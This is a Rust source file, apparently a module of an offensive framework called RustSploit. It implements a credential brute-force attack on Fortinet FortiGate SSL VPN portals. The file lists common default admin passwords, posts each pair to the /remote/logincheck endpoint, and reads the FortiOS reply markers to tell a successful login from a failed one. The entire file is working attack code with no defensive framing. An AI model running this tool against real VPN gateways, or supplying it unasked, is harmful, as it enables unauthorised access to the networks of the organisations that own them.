//! Fortinet FortiGate SSL VPN credential probe via the `/remote/logincheck`
//! POST endpoint.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::network::{build_http_client_with, HttpClientOpts};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 443;

const DEFAULTS: &[(&str, &str)] = &[
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "fortinet"),
    ("admin", "fortigate"),
    ("admin", "12345"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Fortinet SSL VPN Bruteforce".to_string(),
        description:
            "POSTs `username=&secretkey=` to /remote/logincheck on a FortiGate SSL VPN portal \
             and inspects the response body for the redirect / error markers. Single-target — \
             scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: ModuleRank::Normal,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("fortinet_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "fortinet_sslvpn",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/fortinet_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass| async move { probe(&host, port, &user, &pass).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str) -> LoginResult {
    let opts = HttpClientOpts::permissive();
    let client = match build_http_client_with(Duration::from_secs(8), opts) {
        Ok(c) => c,
        Err(e) => {
            return LoginResult::Error {
                message: format!("http client: {e}"),
                retryable: false,
            }
        }
    };
    let url = format!("https://{}:{}/remote/logincheck", host, port);
    let body = format!(
        "username={}&secretkey={}&ajax=1",
        crate::utils::url_encode(user),
        crate::utils::url_encode(pass)
    );
    let resp = client
        .post(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .await;
    let resp = match resp {
        Ok(r) => r,
        Err(e) => {
            return LoginResult::Error {
                message: format!("post: {e}"),
                retryable: e.is_timeout() || e.is_connect(),
            }
        }
    };
    let status = resp.status().as_u16();
    let txt = match resp.text().await {
        Ok(t) => t,
        Err(e) => {
            return LoginResult::Error {
                message: format!("read body: {e}"),
                retryable: true,
            }
        }
    };
    // FortiOS replies with `ret=1,...` on success and `ret=0,error=...` on
    // failure. SAML / 2FA replies start with `redir=`.
    if txt.starts_with("ret=1") || txt.contains("redir=/sslvpn/") {
        LoginResult::Success
    } else if txt.starts_with("ret=0") || status == 401 || status == 403 {
        LoginResult::AuthFailed
    } else {
        LoginResult::Error {
            message: format!("unexpected response status={status} body={}", &txt[..txt.len().min(80)]),
            retryable: false,
        }
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/fortinet_bruteforce", native);
